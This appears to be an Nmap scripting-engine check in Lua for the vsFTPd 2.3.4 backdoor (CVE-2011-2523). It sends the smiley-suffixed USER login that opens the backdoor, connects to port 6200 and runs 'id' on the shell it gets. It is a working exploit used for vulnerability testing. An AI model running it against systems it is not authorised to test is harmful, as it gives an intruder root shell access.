local ftp = require "ftp"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"
categories = {"exploit", "intrusive", "malware", "vuln"}
local CMD_FTP = "USER X:)\r\nPASS X\r\n"
local CMD_SHELL_ID = "id"
portrule = function (host, port)
  if port.version.product ~= nil and port.version.product ~= "vsftpd" then
    return false
  end
  if port.version.version ~= nil and port.version.version ~= "2.3.4" then
    return false
  end
  return shortport.port_or_service(21, "ftp")(host, port)
end
local function finish_ftp(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end
local function check_backdoor(host, shell_cmd, vuln)
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(10000)
  local status, ret = socket:connect(host, 6200, "tcp")
  if not status then
    return finish_ftp(socket, false, "can't connect to tcp port 6200")
  end
  status, ret = socket:send(CMD_SHELL_ID.."\n")
  status, ret = socket:receive_lines(1)
  vuln.state = vulns.STATE.EXPLOIT
  local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
  table.insert(vuln.exploit_results,
    string.format("Results: %s", result))
  socket:send("exit\n");
  return finish_ftp(socket, true)
end
action = function(host, port)
  local cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd") or
  stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID
  local vsftp_vuln = {
    title = "vsFTPd version 2.3.4 backdoor",
    IDS = {CVE = 'CVE-2011-2523', BID = '48539'},
      exploit_results = {},
  }
  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local status, ret = check_backdoor(host, cmd, vsftp_vuln)
  local sock, code, message, buffer = ftp.connect(host, port,
    {request_timeout = 8000})
  status, ret = sock:send(CMD_FTP .. "\r\n")
  stdnse.sleep(1)  
  status, ret = check_backdoor(host, cmd, vsftp_vuln)
  sock:close()
  return report:make_output(vsftp_vuln)
end
